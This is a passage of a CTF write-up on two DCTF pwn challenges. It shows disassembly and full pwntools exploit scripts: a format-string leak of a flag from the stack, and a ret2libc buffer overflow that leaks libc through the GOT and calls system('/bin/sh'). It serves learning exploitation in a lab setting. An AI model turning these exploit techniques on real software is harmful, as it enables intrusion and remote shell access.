</span></span></code></pre></div><h3 id="readme" class="relative group">Readme <span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#readme" aria-label="Anchor">#</a></span></h3><p>This one was a very basic format string challenge, checking the vuln function:-</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-asm" data-lang="asm"><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nf">gef</span><span class="err">➤</span>  <span class="no">disas</span> <span class="no">vuln</span> 
</span></span><span class="line"><span class="cl"><span class="no">Dump</span> <span class="no">of</span> <span class="no">assembler</span> <span class="no">code</span> <span class="no">for</span> <span class="no">function</span> <span class="no">vuln</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x000000000000085a</span> <span class="err">&lt;+</span><span class="mi">0</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">push</span>   <span class="no">rbp</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x000000000000085b</span> <span class="err">&lt;+</span><span class="mi">1</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">mov</span>    <span class="no">rbp</span><span class="p">,</span><span class="no">rsp</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x000000000000085e</span> <span class="err">&lt;+</span><span class="mi">4</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">sub</span>    <span class="no">rsp</span><span class="p">,</span><span class="mi">0x60</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x0000000000000862</span> <span class="err">&lt;+</span><span class="mi">8</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">mov</span>    <span class="no">rax</span><span class="p">,</span><span class="no">QWORD</span> <span class="no">PTR</span> <span class="no">fs</span><span class="p">:</span><span class="mi">0x28</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x000000000000086b</span> <span class="err">&lt;+</span><span class="mi">17</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">mov</span>    <span class="no">QWORD</span> <span class="no">PTR</span> <span class="p">[</span><span class="no">rbp-0x8</span><span class="p">],</span><span class="no">rax</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x000000000000086f</span> <span class="err">&lt;+</span><span class="mi">21</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">xor</span>    <span class="no">eax</span><span class="p">,</span><span class="no">eax</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x0000000000000871</span> <span class="err">&lt;+</span><span class="mi">23</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">lea</span>    <span class="no">rsi</span><span class="p">,[</span><span class="no">rip</span><span class="err">+</span><span class="mi">0x13c</span><span class="p">]</span>        <span class="c1"># 0x9b4
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>   <span class="err">0</span><span class="nf">x0000000000000878</span> <span class="err">&lt;+</span><span class="mi">30</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">lea</span>    <span class="no">rdi</span><span class="p">,[</span><span class="no">rip</span><span class="err">+</span><span class="mi">0x137</span><span class="p">]</span>        <span class="c1"># 0x9b6
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>   <span class="err">0</span><span class="nf">x000000000000087f</span> <span class="err">&lt;+</span><span class="mi">37</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">call</span>   <span class="mh">0x730</span> <span class="p">&lt;</span><span class="no">fopen@plt</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x0000000000000884</span> <span class="err">&lt;+</span><span class="mi">42</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">mov</span>    <span class="no">QWORD</span> <span class="no">PTR</span> <span class="p">[</span><span class="no">rbp-0x58</span><span class="p">],</span><span class="no">rax</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x0000000000000888</span> <span class="err">&lt;+</span><span class="mi">46</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">mov</span>    <span class="no">rdx</span><span class="p">,</span><span class="no">QWORD</span> <span class="no">PTR</span> <span class="p">[</span><span class="no">rbp-0x58</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x000000000000088c</span> <span class="err">&lt;+</span><span class="mi">50</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">lea</span>    <span class="no">rax</span><span class="p">,[</span><span class="no">rbp-0x50</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x0000000000000890</span> <span class="err">&lt;+</span><span class="mi">54</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">mov</span>    <span class="no">esi</span><span class="p">,</span><span class="mi">0x1c</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x0000000000000895</span> <span class="err">&lt;+</span><span class="mi">59</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">mov</span>    <span class="no">rdi</span><span class="p">,</span><span class="no">rax</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x0000000000000898</span> <span class="err">&lt;+</span><span class="mi">62</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">call</span>   <span class="mh">0x720</span> <span class="p">&lt;</span><span class="no">fgets@plt</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x000000000000089d</span> <span class="err">&lt;+</span><span class="mi">67</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">mov</span>    <span class="no">rax</span><span class="p">,</span><span class="no">QWORD</span> <span class="no">PTR</span> <span class="p">[</span><span class="no">rbp-0x58</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x00000000000008a1</span> <span class="err">&lt;+</span><span class="mi">71</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">mov</span>    <span class="no">rdi</span><span class="p">,</span><span class="no">rax</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x00000000000008a4</span> <span class="err">&lt;+</span><span class="mi">74</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">call</span>   <span class="mh">0x6e0</span> <span class="p">&lt;</span><span class="no">fclose@plt</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x00000000000008a9</span> <span class="err">&lt;+</span><span class="mi">79</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">lea</span>    <span class="no">rdi</span><span class="p">,[</span><span class="no">rip</span><span class="err">+</span><span class="mi">0x10f</span><span class="p">]</span>        <span class="c1"># 0x9bf
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>   <span class="err">0</span><span class="nf">x00000000000008b0</span> <span class="err">&lt;+</span><span class="mi">86</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">call</span>   <span class="mh">0x6d0</span> <span class="p">&lt;</span><span class="no">puts@plt</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x00000000000008b5</span> <span class="err">&lt;+</span><span class="mi">91</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">mov</span>    <span class="no">rdx</span><span class="p">,</span><span class="no">QWORD</span> <span class="no">PTR</span> <span class="p">[</span><span class="no">rip</span><span class="err">+</span><span class="mi">0x200754</span><span class="p">]</span>        <span class="c1"># 0x201010 &lt;stdin@@GLIBC_2.2.5&gt;
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>   <span class="err">0</span><span class="nf">x00000000000008bc</span> <span class="err">&lt;+</span><span class="mi">98</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">lea</span>    <span class="no">rax</span><span class="p">,[</span><span class="no">rbp-0x30</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x00000000000008c0</span> <span class="err">&lt;+</span><span class="mi">102</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">mov</span>    <span class="no">esi</span><span class="p">,</span><span class="mi">0x1e</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x00000000000008c5</span> <span class="err">&lt;+</span><span class="mi">107</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">mov</span>    <span class="no">rdi</span><span class="p">,</span><span class="no">rax</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x00000000000008c8</span> <span class="err">&lt;+</span><span class="mi">110</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">call</span>   <span class="mh">0x720</span> <span class="p">&lt;</span><span class="no">fgets@plt</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x00000000000008cd</span> <span class="err">&lt;+</span><span class="mi">115</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">lea</span>    <span class="no">rdi</span><span class="p">,[</span><span class="no">rip</span><span class="err">+</span><span class="mi">0x104</span><span class="p">]</span>        <span class="c1"># 0x9d8
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>   <span class="err">0</span><span class="nf">x00000000000008d4</span> <span class="err">&lt;+</span><span class="mi">122</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">mov</span>    <span class="no">eax</span><span class="p">,</span><span class="mi">0x0</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x00000000000008d9</span> <span class="err">&lt;+</span><span class="mi">127</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">call</span>   <span class="mh">0x700</span> <span class="p">&lt;</span><span class="no">printf@plt</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x00000000000008de</span> <span class="err">&lt;+</span><span class="mi">132</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">lea</span>    <span class="no">rax</span><span class="p">,[</span><span class="no">rbp-0x30</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x00000000000008e2</span> <span class="err">&lt;+</span><span class="mi">136</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">mov</span>    <span class="no">rdi</span><span class="p">,</span><span class="no">rax</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x00000000000008e5</span> <span class="err">&lt;+</span><span class="mi">139</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">mov</span>    <span class="no">eax</span><span class="p">,</span><span class="mi">0x0</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x00000000000008ea</span> <span class="err">&lt;+</span><span class="mi">144</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">call</span>   <span class="mh">0x700</span> <span class="p">&lt;</span><span class="no">printf@plt</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x00000000000008ef</span> <span class="err">&lt;+</span><span class="mi">149</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">nop</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x00000000000008f0</span> <span class="err">&lt;+</span><span class="mi">150</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">mov</span>    <span class="no">rax</span><span class="p">,</span><span class="no">QWORD</span> <span class="no">PTR</span> <span class="p">[</span><span class="no">rbp-0x8</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x00000000000008f4</span> <span class="err">&lt;+</span><span class="mi">154</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">xor</span>    <span class="no">rax</span><span class="p">,</span><span class="no">QWORD</span> <span class="no">PTR</span> <span class="no">fs</span><span class="p">:</span><span class="mi">0x28</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x00000000000008fd</span> <span class="err">&lt;+</span><span class="mi">163</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">je</span>     <span class="mh">0x904</span> <span class="p">&lt;</span><span class="no">vuln</span><span class="p">+</span><span class="mi">170</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x00000000000008ff</span> <span class="err">&lt;+</span><span class="mi">165</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">call</span>   <span class="mh">0x6f0</span> <span class="p">&lt;</span><span class="no">__stack_chk_fail@plt</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x0000000000000904</span> <span class="err">&lt;+</span><span class="mi">170</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">leave</span>  
</span></span><span class="line"><span class="cl">   <span class="mi">0x0000000000000905</span> <span class="err">&lt;+</span><span class="mi">171</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">ret</span>    
</span></span><span class="line"><span class="cl"><span class="no">End</span> <span class="no">of</span> <span class="no">assembler</span> <span class="no">dump.</span>
</span></span><span class="line"><span class="cl"><span class="nf">gef</span><span class="err">➤</span>  
</span></span></code></pre></div><p>We can see it opens the flag.txt file via fopen and read the flag from the file and store it on the stack, then it takes he input via fgets and then print the given input via printf without any format specifier, this proposed the format string vulnerability and with that we can leak the values from the stack, since the flag is also stored on the stack, we can just as well leak it, using the following exploit, we can get flag:-</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-py" data-lang="py"><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">binascii</span> <span class="kn">import</span> <span class="n">unhexlify</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">p</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s2">&#34;dctf-chall-readme.westeurope.azurecontainer.io&#34;</span><span class="p">,</span> <span class="mi">7481</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">p</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s2">&#34;%8$lx-%9$lx-%10$lx-%11$x&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">&#34;hello &#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">output</span> <span class="o">=</span> <span class="n">p</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span><span class="o">.</span><span class="n">strip</span><span class="p">()</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;-&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">flag</span> <span class="o">=</span> <span class="p">[</span><span class="n">unhexlify</span><span class="p">(</span><span class="n">x</span><span class="p">)[::</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span> <span class="k">for</span> <span class="n">x</span> <span class="ow">in</span> <span class="n">output</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;&#34;</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">flag</span><span class="p">)</span><span class="o">+</span><span class="sa">b</span><span class="s2">&#34;}&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">p</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">Running</span> <span class="n">the</span> <span class="n">exploit</span><span class="p">:</span><span class="o">-</span>
</span></span><span class="line"><span class="cl"><span class="n">r</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="err">❯</span> <span class="n">python3</span> <span class="n">readme</span><span class="o">.</span><span class="n">py</span>
</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="n">Opening</span> <span class="n">connection</span> <span class="n">to</span> <span class="n">dctf</span><span class="o">-</span><span class="n">chall</span><span class="o">-</span><span class="n">readme</span><span class="o">.</span><span class="n">westeurope</span><span class="o">.</span><span class="n">azurecontainer</span><span class="o">.</span><span class="n">io</span> <span class="n">on</span> <span class="n">port</span> <span class="mi">7481</span><span class="p">:</span> <span class="n">Done</span>
</span></span><span class="line"><span class="cl"><span class="sa">b</span><span class="s1">&#39;dctf</span><span class="si">{n0w_g0_r3ad_s0me_b00k5}</span><span class="s1">&#39;</span>
</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Closed</span> <span class="n">connection</span> <span class="n">to</span> <span class="n">dctf</span><span class="o">-</span><span class="n">chall</span><span class="o">-</span><span class="n">readme</span><span class="o">.</span><span class="n">westeurope</span><span class="o">.</span><span class="n">azurecontainer</span><span class="o">.</span><span class="n">io</span> <span class="n">port</span> <span class="mi">7481</span>
</span></span></code></pre></div><h3 id="baby-bof" class="relative group">Baby BOF <span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#baby-bof" aria-label="Anchor">#</a></span></h3><p>Baby BOF was normal return to libc attack, since the dockerfile is provided with the challenge which showed that the binary is running in the Ubuntu 20.04 container, hinting that the libc here used is LIBC 2.31, checking the vuln function:-</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-asm" data-lang="asm"><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nf">gef</span><span class="err">➤</span>  <span class="no">disas</span> <span class="no">vuln</span> 
</span></span><span class="line"><span class="cl"><span class="no">Dump</span> <span class="no">of</span> <span class="no">assembler</span> <span class="no">code</span> <span class="no">for</span> <span class="no">function</span> <span class="no">vuln</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x00000000004005b7</span> <span class="err">&lt;+</span><span class="mi">0</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">push</span>   <span class="no">rbp</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x00000000004005b8</span> <span class="err">&lt;+</span><span class="mi">1</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">mov</span>    <span class="no">rbp</span><span class="p">,</span><span class="no">rsp</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x00000000004005bb</span> <span class="err">&lt;+</span><span class="mi">4</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">sub</span>    <span class="no">rsp</span><span class="p">,</span><span class="mi">0x10</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x00000000004005bf</span> <span class="err">&lt;+</span><span class="mi">8</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">lea</span>    <span class="no">rdi</span><span class="p">,[</span><span class="no">rip</span><span class="err">+</span><span class="mi">0xde</span><span class="p">]</span>        <span class="c1"># 0x4006a4
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>   <span class="err">0</span><span class="nf">x00000000004005c6</span> <span class="err">&lt;+</span><span class="mi">15</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">call</span>   <span class="mh">0x4004a0</span> <span class="p">&lt;</span><span class="no">puts@plt</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x00000000004005cb</span> <span class="err">&lt;+</span><span class="mi">20</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">mov</span>    <span class="no">rdx</span><span class="p">,</span><span class="no">QWORD</span> <span class="no">PTR</span> <span class="p">[</span><span class="no">rip</span><span class="err">+</span><span class="mi">0x200a6e</span><span class="p">]</span>        <span class="c1"># 0x601040 &lt;stdin@@GLIBC_2.2.5&gt;
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>   <span class="err">0</span><span class="nf">x00000000004005d2</span> <span class="err">&lt;+</span><span class="mi">27</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">lea</span>    <span class="no">rax</span><span class="p">,[</span><span class="no">rbp-0xa</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x00000000004005d6</span> <span class="err">&lt;+</span><span class="mi">31</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">mov</span>    <span class="no">esi</span><span class="p">,</span><span class="mi">0x100</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x00000000004005db</span> <span class="err">&lt;+</span><span class="mi">36</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">mov</span>    <span class="no">rdi</span><span class="p">,</span><span class="no">rax</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x00000000004005de</span> <span class="err">&lt;+</span><span class="mi">39</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">call</span>   <span class="mh">0x4004c0</span> <span class="p">&lt;</span><span class="no">fgets@plt</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x00000000004005e3</span> <span class="err">&lt;+</span><span class="mi">44</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">lea</span>    <span class="no">rdi</span><span class="p">,[</span><span class="no">rip</span><span class="err">+</span><span class="mi">0xcb</span><span class="p">]</span>        <span class="c1"># 0x4006b5
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>   <span class="err">0</span><span class="nf">x00000000004005ea</span> <span class="err">&lt;+</span><span class="mi">51</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">call</span>   <span class="mh">0x4004a0</span> <span class="p">&lt;</span><span class="no">puts@plt</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x00000000004005ef</span> <span class="err">&lt;+</span><span class="mi">56</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">nop</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x00000000004005f0</span> <span class="err">&lt;+</span><span class="mi">57</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">leave</span>  
</span></span><span class="line"><span class="cl">   <span class="mi">0x00000000004005f1</span> <span class="err">&lt;+</span><span class="mi">58</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">ret</span>    
</span></span></code></pre></div><p>Again, the fgets function call is vulnerable here, we can see that the buffer is of size 0xa while the size acceptable was 0x100 making it vulnerable to buffer overflow.
Now, for the ret2libc part, I would recommend you to start reading here.</p>
<p>The process is exact same, leak the GOT address of the puts and call main again and call system(&quot;/bin/sh&quot;):-</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-py" data-lang="py"><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">p</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s2">&#34;dctf-chall-baby-bof.westeurope.azurecontainer.io&#34;</span><span class="p">,</span> <span class="mi">7481</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s2">&#34;baby_bof&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">libc</span><span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">libc</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">&#34;A&#34;</span><span class="o">*</span><span class="mi">18</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x0000000000400683</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">elf</span><span class="o">.</span><span class="n">got</span><span class="p">[</span><span class="s1">&#39;alarm&#39;</span><span class="p">])</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">elf</span><span class="o">.</span><span class="n">plt</span><span class="p">[</span><span class="s1">&#39;puts&#39;</span><span class="p">])</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">elf</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s1">&#39;main&#39;</span><span class="p">])</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">p</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">p</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="n">libc</span><span class="o">.</span><span class="n">address</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">p</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">6</span><span class="p">)</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\x00</span><span class="s2">&#34;</span><span class="p">))</span> <span class="o">-</span> <span class="n">libc</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s1">&#39;alarm&#39;</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="nb">hex</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">address</span><span class="p">))</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">&#34;A&#34;</span><span class="o">*</span><span class="mi">18</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x000000000040048e</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x0000000000400683</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="nb">next</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">search</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;/bin/sh</span><span class="se">\x00</span><span class="s2">&#34;</span><span class="p">)))</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s1">&#39;system&#39;</span><span class="p">])</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
</span></span></code></pre></div><p>Running the exploit:-</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-asm" data-lang="asm"><span class="line"><span class="cl"><span class="err">❯</span> <span class="nf">python3</span> <span class="no">baby_bof.py</span>
</span></span><span class="line"><span class="cl"><span class="err">[+]</span> <span class="nf">Opening</span> <span class="no">connection</span> <span class="no">to</span> <span class="no">dctf-chall-baby-bof.westeurope.azurecontainer.io</span> <span class="no">on</span> <span class="no">port</span> <span class="mi">7481</span><span class="p">:</span> <span class="no">Done</span>
</span></span><span class="line"><span class="cl"><span class="err">[*]</span> <span class="err">&#39;/</span><span class="nf">home</span><span class="err">/</span><span class="no">d4mianwayne</span><span class="err">/</span><span class="no">Pwning</span><span class="err">/</span><span class="no">CTFs</span><span class="err">/</span><span class="no">dctf</span><span class="err">/</span><span class="no">baby_bof</span><span class="err">&#39;</span>
</span></span><span class="line"><span class="cl">    <span class="nl">Arch:</span>     <span class="nf">amd64-64-little</span>
</span></span><span class="line"><span class="cl">    <span class="nl">RELRO:</span>    <span class="nf">Partial</span> <span class="no">RELRO</span>
</span></span><span class="line"><span class="cl">    <span class="nl">Stack:</span>    <span class="nf">No</span> <span class="no">canary</span> <span class="no">found</span>
</span></span><span class="line"><span class="cl">    <span class="nl">NX:</span>       <span class="nf">NX</span> <span class="no">enabled</span>
</span></span><span class="line"><span class="cl">    <span class="nl">PIE:</span>      <span class="nf">No</span> <span class="no">PIE</span> <span class="p">(</span><span class="mi">0x400000</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="err">[*]</span> <span class="err">&#39;/</span><span class="nf">usr</span><span class="err">/</span><span class="no">lib</span><span class="err">/</span><span class="no">x86_64-linux-gnu</span><span class="err">/</span><span class="no">libc-2.31.so</span><span class="err">&#39;</span>
</span></span><span class="line"><span class="cl">    <span class="nl">Arch:</span>     <span class="nf">amd64-64-little</span>
</span></span><span class="line"><span class="cl">    <span class="nl">RELRO:</span>    <span class="nf">Partial</span> <span class="no">RELRO</span>
</span></span><span class="line"><span class="cl">    <span class="nl">Stack:</span>    <span class="nf">Canary</span> <span class="no">found</span>
</span></span><span class="line"><span class="cl">    <span class="nl">NX:</span>       <span class="nf">NX</span> <span class="no">enabled</span>
</span></span><span class="line"><span class="cl">    <span class="nl">PIE:</span>      <span class="nf">PIE</span> <span class="no">enabled</span>
